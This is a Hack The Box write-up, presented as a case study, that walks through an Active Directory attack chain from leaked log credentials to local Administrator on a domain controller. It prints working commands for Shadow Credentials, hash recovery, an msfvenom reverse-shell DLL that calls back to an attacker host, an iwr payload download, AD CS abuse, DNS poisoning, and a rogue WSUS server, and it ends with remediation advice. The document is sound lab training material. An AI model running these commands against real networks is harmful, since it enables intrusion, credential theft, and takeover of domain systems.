---
title: "Logging — Log Leak, Shadow Credentials, and Rogue WSUS to SYSTEM"
description: "A log-file credential leak, Shadow Credentials abuse, and a rogue update server chain to SYSTEM code execution."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - shadow-credentials
  - dll-hijack
  - wsus
objective: "Chain a leaked service credential, Shadow Credentials, a DLL hijack, AD CS abuse, and a rogue WSUS server into administrative access on the domain controller."
tools:
  - rustscan
  - NetExec
  - rusthound-ce
  - pywhisker
  - gettgtpkinit
  - getnthash
  - evil-winrm
  - msfvenom
  - zip
  - rubeus
  - Certipy
  - openssl
  - dnstool
  - netcat
skill: "Active Directory attack-path analysis across credentials, PKI, and update infrastructure"
outcome: "Administrative WinRM access after the managed service account is added to local Administrators"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Hard |
| Target environment | Windows Server Active Directory domain (DNS, IIS, Kerberos, LDAP/LDAPS, SMB, WinRM, WSUS) |
| Starting position | Provided low-privilege domain credentials |
| Objective | Chain a leaked service credential, Shadow Credentials, a DLL hijack, AD CS abuse, and a rogue WSUS server into administrative access on the domain controller |
| Outcome | Managed service account added to local Administrators; privileged WinRM access |

## Leaked log credential to rogue WSUS

Logging is a Hard-rated Hack The Box Windows Active Directory lab that chains a diagnostic log credential leak, Shadow Credentials abuse against a managed service account, a DLL hijack in an update monitor, AD CS certificate abuse, AD-integrated DNS record manipulation, and a rogue WSUS server that executes a trusted binary as SYSTEM. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). Where no output was captured, I could not verify the result directly, so the documented result is given instead.

**Attack path:** **Provided domain credential → leaked service credential → year-rotated password → Shadow Credentials → NT hash → DLL hijack → AD CS certificate → AD DNS record → rogue WSUS → local Administrators**

## AD domain with provided low-privilege credentials

- **Target:** a Windows Active Directory domain (`<DOMAIN>`, domain controller `<DC_HOSTNAME>`) exposing DNS (53), IIS (80), Kerberos (88), LDAP/LDAPS (389/636), SMB (445), WinRM (5985), and WSUS (8530/8531).
- **Starting position:** provided low-privilege domain credentials for `<LAB_USER>`.
- **Objective:** move from the provided account to administrative access on the domain controller through the observed weaknesses.
- **Constraints:** activity stayed inside the Hack The Box lab environment.

## Evidence: log leak to rogue WSUS SYSTEM

### 1. Enumeration and Credential Discovery

Observation: a full TCP scan exposes the domain services, and SMB access with the provided account reveals a readable `Logs` share.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/<OUT_FILE>
```

Truncated scan output:

```text
53/tcp     DNS
80/tcp     IIS
88/tcp     Kerberos
389/636    LDAP/LDAPS
445/tcp    SMB
5985/tcp   WinRM
8530/8531  WSUS
```

The share is retrieved with the provided account:

```bash
nxc smb <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>' --shares
nxc smb <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
```

Its identity synchronization trace log holds a plaintext bind credential:

```text
BindUser: "<DOMAIN>\<SERVICE_ACCOUNT>"
BindPass: "<SERVICE_PASSWORD_2025>"
```

The leaked value carries a year suffix, so I tried the current-year variant, which authenticates over Kerberos:

```bash
nxc smb <DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_PASSWORD_2026>' -d <DOMAIN> -k
[+] <DOMAIN>\<SERVICE_ACCOUNT>:<SERVICE_PASSWORD_2026>
```

Significance: the trace log stored a plaintext bind password in a share readable by the low-privileged account, and the predictable year rotation made the stale-looking value current. The account requires Kerberos, so `-k` is used.

Result: the service credential is recovered and subsequently validated through Kerberos authentication. `rusthound-ce` collection then maps the account's domain permissions.

### 2. Shadow Credentials to the Managed Service Account

Observation: collection shows `<SERVICE_ACCOUNT>` has `GenericWrite` over the managed service account `<MANAGED_SERVICE_ACCOUNT>`, which permits Shadow Credentials abuse.

```bash
python3 pywhisker.py \
  -d <DOMAIN> \
  -u '<SERVICE_ACCOUNT>' \
  -p '<SERVICE_PASSWORD_2026>' \
  --target '<MANAGED_SERVICE_ACCOUNT>' \
  --action add -k
```

The tool writes a key credential and returns a PFX with its password:

```text
[+] Saved PFX (#PKCS12) certificate & key at path: <SHADOW_CREDENTIALS_PFX>
[*] Must be used with password: <PFX_PASSWORD>
```

The PFX is used with `gettgtpkinit.py` to obtain a TGT, then `getnthash.py` recovers the account's NT hash:

```bash
python3 gettgtpkinit.py \
  -cert-pfx <SHADOW_CREDENTIALS_PFX> \
  -pfx-pass <PFX_PASSWORD> \
  '<DOMAIN>/<MANAGED_SERVICE_ACCOUNT>' '<MANAGED_SERVICE_ACCOUNT>.ccache'

export KRB5CCNAME='<MANAGED_SERVICE_ACCOUNT>.ccache'

python3 getnthash.py \
  -key <TGT_SESSION_KEY> \
  '<DOMAIN>/<MANAGED_SERVICE_ACCOUNT>'
```

```text
Recovered NT Hash: <MSA_NT_HASH>
```

Significance: `GenericWrite` over the managed account lets an attacker-controlled key credential be written to `msDS-KeyCredentialLink`; PKINIT turns it into a TGT, and the account's NT hash follows without the password.

Result: `<MSA_NT_HASH>` is recovered and used to open a WinRM session as `<MANAGED_SERVICE_ACCOUNT>` (`evil-winrm -i <TARGET_IP> -u '<MANAGED_SERVICE_ACCOUNT>' -H <MSA_NT_HASH>`).

### 3. DLL Hijack to Another Domain User

Observation: inside the managed service account session, the UpdateMonitor scheduled-task log shows the update applier DLL failing to load; the task is documented as running as a different domain user.

```powershell
type C:\ProgramData\UpdateMonitor\Logs\monitor.log
```

```text
No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip
Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
Failed to load settings_update.dll. Error code: 126
```

The binary is confirmed 32-bit before a matching payload is built:

```powershell
$bytes = Get-Content "C:\Program Files\UpdateMonitor\UpdateMonitor.exe" -Encoding Byte -TotalCount 256
$peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
$machine = [BitConverter]::ToUInt16($bytes, $peOffset + 4)
"Machine type: 0x{0:X4}" -f $machine
```

```text
Machine type: 0x014C  (x86 32-bit)
```

A 32-bit DLL is generated, packaged into the archive the task expects, and placed at the monitored path:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTEN_PORT> -f dll -o settings_update.dll
zip Settings_Update.zip settings_update.dll
```

```powershell
iwr -OutFile C:\ProgramData\UpdateMonitor\Settings_Update.zip http://<ATTACKER_IP>:<HTTP_PORT>/Settings_Update.zip
```

```bash
nc -nlvp <LISTEN_PORT>
```

```text
C:\Windows\system32> whoami
<DOMAIN>\<COMPROMISED_USER>
```

Significance: the scheduled task extracts an archive into a writable path and loads a DLL by name; supplying a matching-architecture DLL in place of the missing one executes code in the task's user context.

Result: a shell is obtained as `<COMPROMISED_USER>`.

### 4. AD CS Certificate for the Update-Service Hostname

Observation: `<COMPROMISED_USER>` can enroll in the `UpdateSrv` AD CS template, which allows the enrollee to supply a subject name and includes the Server Authentication EKU. A Kerberos ticket for `<COMPROMISED_USER>`, retrieved from the existing Windows session with Rubeus and converted to a ccache, lets the request authenticate with `-k -no-pass`.

```bash
certipy req -k -no-pass \
  -u '<COMPROMISED_USER>@<DOMAIN>' \
  -ca '<CERTIFICATE_AUTHORITY>' \
  -template 'UpdateSrv' \
  -dns '<UPDATE_SERVICE_HOSTNAME>' \
  -target <DC_HOSTNAME> \
  -dc-ip <TARGET_IP>
```

The issued certificate and key are extracted into PEM format for the rogue server:

```bash
openssl pkcs12 -in <WSUS_PFX> -nokeys -out <WSUS_CRT> -nodes -passin pass:
openssl pkcs12 -in <WSUS_PFX> -nocerts -out <WSUS_KEY> -nodes -passin pass:
```

Significance: subject-name injection plus the Server Authentication EKU produces a certificate for `<UPDATE_SERVICE_HOSTNAME>` that a WSUS client accepts as the trusted TLS identity.

Result: a certificate and private key valid for `<UPDATE_SERVICE_HOSTNAME>` were obtained.

### 5. AD DNS Record Creation

Observation: `<MANAGED_SERVICE_ACCOUNT>` holds write permission on the AD-integrated zone, so it can create a record for the update-service hostname.

```bash
python3 dnstool.py \
  -u '<DOMAIN>\<MANAGED_SERVICE_ACCOUNT>' \
  -p '<MSA_LM_HASH>:<MSA_NT_HASH>' \
  -r <UPDATE_SERVICE_HOSTNAME> \
  -a add \
  -d <ATTACKER_IP> \
  <TARGET_IP>
```

```bash
nslookup <UPDATE_SERVICE_HOSTNAME> <TARGET_IP>
```

```text
Name:    <UPDATE_SERVICE_HOSTNAME>
Address: <ATTACKER_IP>
```

Significance: an account with create rights on the integrated zone can point a trusted hostname at the operator address; with the certificate, the client's WSUS trust checks pass.

Result: `<UPDATE_SERVICE_HOSTNAME>` resolves to `<ATTACKER_IP>`.

### 6. Rogue WSUS Server and SYSTEM Execution

Observation: WSUS clients trust the update-service hostname, and a signed Microsoft binary delivered from a rogue server runs as SYSTEM.

The rogue server serves the signed binary with an argument that adds the managed service account to local administrators:

```python
COMMAND = '/accepteula /s cmd.exe /c "net localgroup administrators <MANAGED_SERVICE_ACCOUNT> /add"'
```

Windows Update is triggered from the managed service account session:

```powershell
Stop-Service wuauserv -Force
Remove-Item "C:\Windows\SoftwareDistribution" -Recurse -Force
Start-Service wuauserv
wuauclt /resetauthorization /detectnow
usoclient StartScan
```

```powershell
net localgroup administrators
```

```text
Administrator
Domain Admins
Enterprise Admins
<MANAGED_SERVICE_ACCOUNT>
```

Significance: the rogue endpoint satisfies the client's trust, and the signed binary executes the delivered command as SYSTEM, adding the managed service account to local Administrators.

Result: the account is now a local administrator, and its refreshed session yields privileged WinRM access (`evil-winrm -i <TARGET_IP> -u '<MANAGED_SERVICE_ACCOUNT>' -H <MSA_NT_HASH>`).

## Stale year password, 32-bit applier, and WSUS trust

| Challenge | Decision | Rationale |
|---|---|---|
| The leaked service password was a stale year variant | Incremented the year suffix and re-authenticated | The pattern was derived from the log's date context, and the rotated value authenticated over Kerberos |
| The UpdateMonitor process is 32-bit | Built and packaged a matching 32-bit DLL | The scheduled workflow requires matching process architecture for the load to succeed |
| A WSUS endpoint needs a trusted server certificate | Enrolled in the `UpdateSrv` subject-injection template with the Server Authentication EKU | Subject injection lets the requested name match the update-service hostname |

## Outcome: local Administrators and privileged WinRM

The path runs from the provided domain credential to administrative access on the domain controller. Tool output shows the recovered credentials and hashes, an authenticated `whoami` proves the DLL hijack, and the local-Administrators listing proves the privilege change. The demonstrated privilege is local-Administrator membership on the domain controller, exercised through privileged WinRM.

## Recommendations: log secrets, MSA ACLs, AD CS templates, DNS records, DLL loading, and WSUS trust

The actions below remain recommendations; this case study did not test remediation.

1. **Plaintext credentials in diagnostic logs.** A synchronization trace log recorded a plaintext bind password in a share readable by the low-privileged account, and its predictable year rotation yielded service-account access. *Recommendation:* strip secrets from diagnostic logs, remove diagnostic shares from general read access, and monitor credentials appearing in log content.
2. **Weak ACLs on managed service accounts.** `<SERVICE_ACCOUNT>` could write `<MANAGED_SERVICE_ACCOUNT>`'s `msDS-KeyCredentialLink`, so Shadow Credentials produced a TGT and the account's NT hash. *Recommendation:* audit and tier ACLs on managed service accounts, and *detection:* monitor unexpected key-credential writes.
3. **AD CS template allowing subject-name injection with Server Authentication EKU.** Enrollee-controlled subject names plus the server-auth EKU let a rogue endpoint present a trusted certificate for the update-service hostname. *Recommendation:* restrict enrollment and manager approval, and remove EKUs a template does not require.
4. **Unrestricted AD-integrated DNS record creation.** The managed account could create a record for a trusted hostname, redirecting the update endpoint to an operator address. *Detection:* monitor new or changed records for update and infrastructure names.
5. **DLL search-order hijack in a scheduled update task.** The task loaded `settings_update.dll` by name from a writable path, so a matching-architecture DLL executed as the task user. *Recommendation:* load dependencies by fully qualified path from safe search directories and verify the applier binary.
6. **WSUS client trust without endpoint pinning.** The client accepted any server presenting a certificate valid for the hostname, so a rogue WSUS server delivered a signed binary that ran as SYSTEM. *Recommendation:* require mutual TLS or certificate pinning for update endpoints and inventory trusted roots.

## References

- [Hack The Box — Logging](https://app.hackthebox.com/machines/Logging) (retired machine)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [NetExec (`nxc`)](https://github.com/Pennyw0rth/NetExec) (SMB and LDAP operations)
- [rusthound-ce](https://github.com/g0h4n/rusthound-ce) (BloodHound CE collection)
- [pywhisker](https://github.com/ShutdownRepo/pywhisker) (Shadow Credentials)
- [PKINITtools — `gettgtpkinit.py`, `getnthash.py`](https://github.com/dirkjanm/PKINITtools) (PKINIT authentication and hash recovery)
- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and abuse)
- [krbrelayx — `dnstool.py`](https://github.com/dirkjanm/krbrelayx) (AD-integrated DNS record manipulation)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
- [Metasploit `msfvenom`](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) (payload generation)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos ticket request from the Windows session)
- [OpenSSL `pkcs12`](https://docs.openssl.org/master/man1/openssl-pkcs12/) (PFX certificate and key extraction)
- [msDS-KeyCredentialLink ([MS-ADA2])](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/45916e5b-d66f-444e-b1e5-5b0666ed4d66) (attribute backing Shadow Credentials)
- [Certificate template concepts (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts)
- [Dynamic-link library search order (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [Active Directory-integrated DNS zones (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/active-directory-integrated-dns-zones)
- [Deploy Windows Server Update Services (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/deploy-windows-server-update-services)
